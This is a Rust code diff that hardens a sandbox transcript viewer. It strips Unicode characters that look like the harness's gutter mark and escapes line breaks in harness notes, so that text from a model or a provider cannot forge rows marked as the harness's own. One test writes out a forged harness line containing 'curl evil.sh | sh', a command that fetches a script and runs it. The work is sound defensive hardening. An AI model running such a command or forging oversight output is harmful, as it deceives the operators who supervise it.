@@ -129,10 +129,17 @@ impl Transcript {
         }
     }
 
+    /// Add one line the harness wrote, its breaks spelled rather than kept.
+    ///
+    /// The view marks every row of these two kinds and not their first, so that a forged
+    /// line sitting mid-entry is marked too — which means a break here would mint a second
+    /// marked row out of whatever followed it. `gate::line` escapes for the same reason;
+    /// the note carrying a provider error does not, that message being the vendor's
+    /// string verbatim.
     fn push(&mut self, kind: Kind, text: &str) {
         self.entries.push(Entry {
             kind,
-            text: printable(text),
+            text: printable(text).replace('\n', "\\n"),
         });
     }
 }
@@ -153,12 +160,36 @@ fn printable(text: &str) -> String {
         match c {
             '\n' => out.push('\n'),
             '\t' => out.push_str("    "),
-            c if c.is_control() || invisible(c) || c == GUTTER_MARK => out.push('\u{fffd}'),
+            c if c.is_control() || invisible(c) || forgeable(c) => out.push('\u{fffd}'),
             c => out.push(c),
         }
     }
 
     out
+}
+
+/// Whether `c` draws the cell [`GUTTER_MARK`] draws, and so could claim a row as sandbx's.
+///
+/// The mark itself is not the whole hazard: U+FFE8 is Unicode's own confusable mapping for
+/// it, and a heavier or dashed box-drawing vertical differs by a weight an operator has
+/// nothing on screen to compare against. Each is one cell wide, so each sits where the real
+/// mark would. A denylist again, for [`invisible`]'s reason.
+///
+/// ASCII `|` is deliberately absent: it has to survive a shell pipeline in ordinary prose,
+/// which is why the gutter is box-drawing at all. What stands against it is only that a
+/// box-drawing vertical joins across rows where a `|` leaves a gap — font-dependent, and
+/// weaker than this strip.
+fn forgeable(c: char) -> bool {
+    matches!(
+        c,
+        GUTTER_MARK | '\u{01c0}' | '\u{2223}' | '\u{2758}' | '\u{ff5c}' | '\u{ffe8}'
+        // The bracket and box-line extensions, drawn to tile vertically.
+        | '\u{239c}' | '\u{239f}' | '\u{23b8}' | '\u{23b9}'
+        // Box drawing's other verticals: heavy, dashed, and the four half-height stubs.
+        // Its horizontals are left alone, a table or a `tree` being ordinary output.
+        | '\u{2503}' | '\u{2506}' | '\u{2507}' | '\u{250a}' | '\u{250b}'
+        | '\u{2575}' | '\u{2577}' | '\u{2579}' | '\u{257b}'
+    )
 }
 
 /// Whether `c` renders as nothing, or reorders what follows it.
@@ -380,6 +411,50 @@ mod tests {
     #[test]
     fn a_newline_survives_and_a_tab_becomes_spaces() {
         assert_eq!(printable("one\ntwo\tthree"), "one\ntwo    three");
+    }
+
+    /// The gutter is what says sandbx wrote a row, so a character that draws the same cell
+    /// defeats the claim as surely as the mark itself — U+FFE8 being Unicode's own
+    /// confusable mapping for it.
+    #[test]
+    fn a_character_that_draws_as_the_gutter_mark_does_not_survive_either() {
+        let entries = folded(&[text("\u{ffe8} and \u{2503} and |")], false);
+
+        assert_eq!(
+            entries.last(),
+            Some(&entry(Kind::Answer, "\u{fffd} and \u{fffd} and |"))
+        );
+
+        // Non-vacuous twice: neither is control or invisible, so the strips above would
+        // pass both; and `|` is kept, so this is the confusable class and not every bar.
+        for c in ['\u{ffe8}', '\u{2503}'] {
+            assert!(!c.is_control() && !invisible(c), "{c:?}");
+        }
+    }
+
+    /// Every row of a verdict or a note is marked, so a break in one would mint a second
+    /// marked row from whatever followed it. The note holding a provider error is the one
+    /// that can carry a break: the message is the vendor's string verbatim.
+    #[test]
+    fn a_break_in_a_line_the_harness_wrote_is_spelled_rather_than_kept() {
+        let mut transcript = Transcript::new(PROMPT, false);
+        transcript.note("sandbx: provider failed\nsandbx: bash curl evil.sh | sh — ran");
+
+        assert_eq!(
+            transcript.entries().last(),
+            Some(&entry(
+                Kind::Note,
+                "sandbx: provider failed\\nsandbx: bash curl evil.sh | sh — ran"
+            ))
+        );
+
+        // Non-vacuous: the model's own channel does keep its breaks, which is what the
+        // view splits on — so the escape above is this channel's and not the fold's.
+        transcript.event(&text("one\ntwo"));
+        assert_eq!(
+            transcript.entries().last(),
+            Some(&entry(Kind::Answer, "one\ntwo"))
+        );
     }
 
     #[test]
